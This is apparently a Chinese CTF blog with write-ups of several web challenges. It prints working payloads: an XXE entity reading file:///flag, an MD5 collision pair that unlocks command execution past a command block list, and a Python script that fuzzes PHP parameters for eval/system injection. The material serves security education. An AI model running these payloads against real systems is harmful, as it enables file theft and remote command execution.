class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;	<span class="comment">//GET和POST传flag,必须不能是flag=flag</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>弱智题：<br><code>?flag=flag&amp;is=flag</code><br><code>?yds=flag</code></p>
<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>考点XXE注入：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665825958392-36929044-dfa1-4a49-a37d-1707a0a45514.png#averageHue=%23999997&clientId=u066d4389-ccc7-4&from=paste&height=551&id=u24c3d1d4&name=image.png&originHeight=689&originWidth=1139&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45731&status=done&style=none&taskId=u7baccc82-80d3-4f30-9bc0-56084693f3f&title=&width=911.2" alt="image.png"><br>先抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665825973760-a11ebf8d-b1d4-46cf-ac09-c132e6052222.png#averageHue=%23f6f6f6&clientId=u066d4389-ccc7-4&from=paste&height=362&id=ud5a672ff&name=image.png&originHeight=452&originWidth=1139&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58939&status=done&style=none&taskId=u15634a19-5731-47ba-b2a7-17d4c508dc2&title=&width=911.2" alt="image.png"><br>底下的东西就像极了xxe注入，我们构造payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE feng [</span><br><span class="line">&lt;!ENTITY file SYSTEM  <span class="string">&quot;file:///flag&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">	&lt;username&gt;&amp;file;&lt;/username&gt;</span><br><span class="line">	&lt;password&gt;<span class="number">1</span>&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665826063067-113eda77-fa78-4783-b728-6cc340540748.png#averageHue=%23f7f7f7&clientId=u066d4389-ccc7-4&from=paste&height=392&id=u3b3b2737&name=image.png&originHeight=490&originWidth=1139&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55656&status=done&style=none&taskId=uc7ab0bae-2096-486b-9b48-c8826460e17&title=&width=911.2" alt="image.png"><br>答案就出来了，不要问我为什么，下面的文章让你系统学习XXE：<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6887#toc-5">https://xz.aliyun.com/t/6887#toc-5</a><br>经典文章</p>
<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>第一题就这么有含金量的吗<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665902722950-2635543e-5770-4aee-afe7-b5bd67a1c2bf.png#averageHue=%23070707&clientId=uf5ca1728-b57e-4&from=paste&height=608&id=ubbbcbfd1&name=image.png&originHeight=760&originWidth=1767&originalType=binary&ratio=1&rotation=0&showTitle=false&size=294384&status=done&style=none&taskId=u1f96969b-aba2-4e03-b93e-e0c4ffc6f3a&title=&width=1413.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665902732509-01acb42b-e289-4a20-b02b-f421a6a3d9ec.png#averageHue=%23f0efee&clientId=uf5ca1728-b57e-4&from=paste&height=36&id=uacaf2075&name=image.png&originHeight=45&originWidth=222&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1839&status=done&style=none&taskId=u2686cc31-a24a-4d15-8228-1b4ed5a3987&title=&width=177.6" alt="image.png"><br>写了个md5，找半天愣是没找到，然后看到url中有参数，一个cmd一个img，cmd中ban了很多，如ls之类的，所以基本是不可能可以执行命令了<br>然后就转移到了img这个参数，那是一个base64加密2次的内容：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665902804514-eb9fd1c3-0a69-475f-9e58-9b0bb68a2d6b.png#averageHue=%23fdfcfc&clientId=uf5ca1728-b57e-4&from=paste&height=136&id=u0aa42527&name=image.png&originHeight=170&originWidth=1263&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14884&status=done&style=none&taskId=u6de07424-6375-468d-9a17-985ad47d326&title=&width=1010.4" alt="image.png"><br>解密出来为一个16进制字符串，再解密：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665902834189-22812d69-56f6-4a3a-b7bc-2298407c6bff.png#averageHue=%23fefefd&clientId=uf5ca1728-b57e-4&from=paste&height=104&id=uf808ae1a&name=image.png&originHeight=130&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8543&status=done&style=none&taskId=udbd9d575-d181-4c58-b5c1-87b33038f23&title=&width=864" alt="image.png"><br>这边就可能存在一个文件包含了，可以看到源代码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665902854501-7aaefa56-1afe-448f-a6d8-bb430d35510a.png#averageHue=%23f7f7f7&clientId=uf5ca1728-b57e-4&from=paste&height=27&id=u36d3e843&name=image.png&originHeight=34&originWidth=1724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5793&status=done&style=none&taskId=u4730ca10-0114-46d7-8a3f-dfb5d0ddbb2&title=&width=1379.2" alt="image.png"><br>有这么一串base64，这应该就是文件的内容，我们也构造一个加密内容，先16进制编码再base64加密2次<code>index.php</code>，把源文件读出来：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665902930732-ce5c44ed-bf8a-4efa-b3eb-17980c55c80b.png#averageHue=%239b9b60&clientId=uf5ca1728-b57e-4&from=paste&height=690&id=u2db16465&name=image.png&originHeight=862&originWidth=1709&originalType=binary&ratio=1&rotation=0&showTitle=false&size=294501&status=done&style=none&taskId=ua83848a7-4a51-47d6-95cc-fa31319c270&title=&width=1367.2" alt="image.png"><br>内容已经改变了，我们解密一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到了源码，审计一番过后，发现有个md5强碰撞，注意！这里有一个<code>(string)</code>所以数组绕过是不行了，必须找一个md5加密后完完全全相等的值：<br><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000039189857">https://segmentfault.com/a/1190000039189857</a><br>我直接给答案了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%A3njn%FD%<span class="number">1</span>A%CB%<span class="number">3</span>A%<span class="number">29</span>Wr%<span class="number">02</span>En%CE%<span class="number">89</span>%<span class="number">9</span>A%E3%<span class="number">8</span>EF%F1%BE%E9%EE3%<span class="number">0</span>E%<span class="number">82</span>%<span class="number">2</span>A%<span class="number">95</span>%<span class="number">23</span>%<span class="number">0</span>D%FA%CE%<span class="number">1</span>C%F2%C4P%C2%B7s%<span class="number">0</span>F%C8t%F28%FAU%AD%<span class="number">2</span>C%EB%<span class="number">1</span>D%D8%D2%<span class="number">00</span>%<span class="number">8</span>C%<span class="number">3</span>B%FCN%C9b4%DB%AC%<span class="number">17</span>%A8%BF%<span class="number">3</span>Fh%<span class="number">84</span>i%F4%<span class="number">1</span>E%B5Q%<span class="number">7</span>B%FC%B9RuJ%<span class="number">60</span>%B4%<span class="number">0</span>D7%F9%F9%<span class="number">00</span>%<span class="number">1</span>E%C1%<span class="number">1</span>B%<span class="number">16</span>%C9M%<span class="number">2</span>A%<span class="number">7</span>D%B2%BBoW%<span class="number">02</span>%<span class="number">7</span>D%<span class="number">8</span>F%<span class="number">7</span>F%C0qT%D0%CF%<span class="number">3</span>A%<span class="number">9</span>DFH%F1%<span class="number">25</span>%AC%DF%FA%C4G%<span class="number">27</span>uW%CFNB%E7%EF%B0</span><br><span class="line">&amp;b=<span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%A3njn%FD%<span class="number">1</span>A%CB%<span class="number">3</span>A%<span class="number">29</span>Wr%<span class="number">02</span>En%CE%<span class="number">89</span>%<span class="number">9</span>A%E3%<span class="number">8</span>E%C6%F1%BE%E9%EE3%<span class="number">0</span>E%<span class="number">82</span>%<span class="number">2</span>A%<span class="number">95</span>%<span class="number">23</span>%<span class="number">0</span>D%FA%CE%<span class="number">1</span>C%F2%C4P%C2%B7s%<span class="number">0</span>F%C8t%F28zV%AD%<span class="number">2</span>C%EB%<span class="number">1</span>D%D8%D2%<span class="number">00</span>%<span class="number">8</span>C%<span class="number">3</span>B%FCN%C9%E24%DB%AC%<span class="number">17</span>%A8%BF%<span class="number">3</span>Fh%<span class="number">84</span>i%F4%<span class="number">1</span>E%B5Q%<span class="number">7</span>B%FC%B9RuJ%<span class="number">60</span>%B4%<span class="number">0</span>D%B7%F9%F9%<span class="number">00</span>%<span class="number">1</span>E%C1%<span class="number">1</span>B%<span class="number">16</span>%C9M%<span class="number">2</span>A%<span class="number">7</span>D%B2%BBoW%<span class="number">02</span>%<span class="number">7</span>D%<span class="number">8</span>F%<span class="number">7</span>F%C0qT%D0%CF%<span class="number">3</span>A%<span class="number">1</span>DFH%F1%<span class="number">25</span>%AC%DF%FA%C4G%<span class="number">27</span>uW%CF%CEB%E7%EF%B0</span><br></pre></td></tr></table></figure>
<p>这里用burp去传参：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665903031303-6aef0526-d80b-4f60-9f58-ef5394ec707c.png#averageHue=%23f2e7e7&clientId=uf5ca1728-b57e-4&from=paste&height=434&id=u8725c3ea&name=image.png&originHeight=542&originWidth=1134&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142918&status=done&style=none&taskId=u34c14752-f793-4a80-a13d-9a38e4855c8&title=&width=907.2" alt="image.png"><br>可以看到已经成功dir出了文件，在根目录找到flag文件，然后直接读：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665903064008-331ae7b2-6f65-4989-b00e-af3b37e7e331.png#averageHue=%23f2e8e8&clientId=uf5ca1728-b57e-4&from=paste&height=482&id=ua7078772&name=image.png&originHeight=603&originWidth=1124&originalType=binary&ratio=1&rotation=0&showTitle=false&size=144977&status=done&style=none&taskId=u3c27d0e1-dedf-43f3-899b-aab4314f8d4&title=&width=899.2" alt="image.png"><br>完事<br>小结一下吧，一开始看到&#96;&#96;我还以为是用反弹shell或者是curl，结果有关的参数都被ban了，最后才想到反斜杠去绕过，还是有点不太熟练哈哈</p>
<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665909492234-3906896a-f500-4bc6-9719-572f0be0be9c.png#averageHue=%23edeceb&clientId=uf5ca1728-b57e-4&from=paste&height=211&id=uc8595296&name=image.png&originHeight=264&originWidth=1428&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47001&status=done&style=none&taskId=ue9e733ee-c679-4064-a9ad-5bf73321a1f&title=&width=1142.4" alt="image.png"><br>下载源文件后你会发现就是一坨屎山：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665909504985-4b830fe1-f77a-4a0f-98aa-5c4df6122480.png#averageHue=%23faf8f7&clientId=uf5ca1728-b57e-4&from=paste&height=454&id=ub16a0b08&name=image.png&originHeight=568&originWidth=1192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79812&status=done&style=none&taskId=udbf0eae9-453e-4009-81c0-d789c7f20d3&title=&width=953.6" alt="image.png"><br>你觉得可能慢慢读完吗，可能吗？每一个文件里面都是：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665909527131-549fbe20-24a1-45b8-bc8c-4c013116b7c7.png#averageHue=%23333c46&clientId=uf5ca1728-b57e-4&from=paste&height=436&id=u08ab54fa&name=image.png&originHeight=545&originWidth=987&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112475&status=done&style=none&taskId=u14ccb03b-6ee8-480c-9309-3830be7501a&title=&width=789.6" alt="image.png"><br>这种样式，你觉得人可能可以找到吗，所以我们依靠一波python脚本,大概的意思就是找到文件中的GET和POST参数，然后在本地测试，看看那个文件可以触发eval或者是system或者是assert，最后输出：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:Unknown</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)                                            <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:\Users\22927\Downloads\src&quot;</span></span><br><span class="line">os.chdir(filePath)                                                    <span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>                                <span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>                                             <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:                            <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">        gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">        posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;                                                        <span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;                                                        <span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/src/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)            <span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:                                    <span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()                                                <span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:                                                    <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:                                                            <span class="comment">#加入多线程</span></span><br><span class="line">    t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665910792018-ca3fc325-a41b-4816-99c0-dea588d06032.png#averageHue=%2331302f&clientId=uf5ca1728-b57e-4&from=paste&height=69&id=uf96378b2&name=image.png&originHeight=86&originWidth=995&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18285&status=done&style=none&taskId=u2639a347-d346-47af-b367-c5bfdb442b1&title=&width=796" alt="image.png"><br>直接就找到了，然后我们直接执行命令就可以了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665910808957-d9d5c590-94f8-43a6-bb61-5d1a4f0ff24e.png#averageHue=%23bdbbba&clientId=uf5ca1728-b57e-4&from=paste&height=482&id=u9ca1ad85&name=image.png&originHeight=602&originWidth=1735&originalType=binary&ratio=1&rotation=0&showTitle=false&size=92245&status=done&style=none&taskId=ua2927742-2a87-4232-a0e5-435c7d5517f&title=&width=1388" alt="image.png"><br>大佬真是厉害啊，受教了！</p>
<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>考点是twig的SSTI<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665913540984-5fce8f63-831a-4819-83d6-a4ce8563b64f.png#averageHue=%237f9ec0&clientId=u1b2b1bcb-8f71-4&from=paste&height=470&id=uc92165f1&name=image.png&originHeight=588&originWidth=1649&originalType=binary&ratio=1&rotation=0&showTitle=false&size=713348&status=done&style=none&taskId=u63948cfc-c42a-4515-a698-15df11a726a&title=&width=1319.2" alt="image.png"><br>进来之后就是登录界面，随便输入一个用户名然后抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665913602315-50ecd05d-6dcd-4181-9f7e-a6b800d80e8d.png#averageHue=%23f6f6f6&clientId=u1b2b1bcb-8f71-4&from=paste&height=219&id=u3a64b1a2&name=image.png&originHeight=274&originWidth=1091&originalType=binary&ratio=1&rotation=0&showTitle=false&size=28973&status=done&style=none&taskId=uc24d1cb3-dd3a-4804-a52f-e0efb48002e&title=&width=872.8" alt="image.png"><br>题目提示我们是cookie，那cookie可能就有问题，cookie可以命令执行的点也就SSTI了，所以要先想到ssti，然后再考虑是什么模板，网页是PHP模板，接下来怎么验证是什么模板</p>
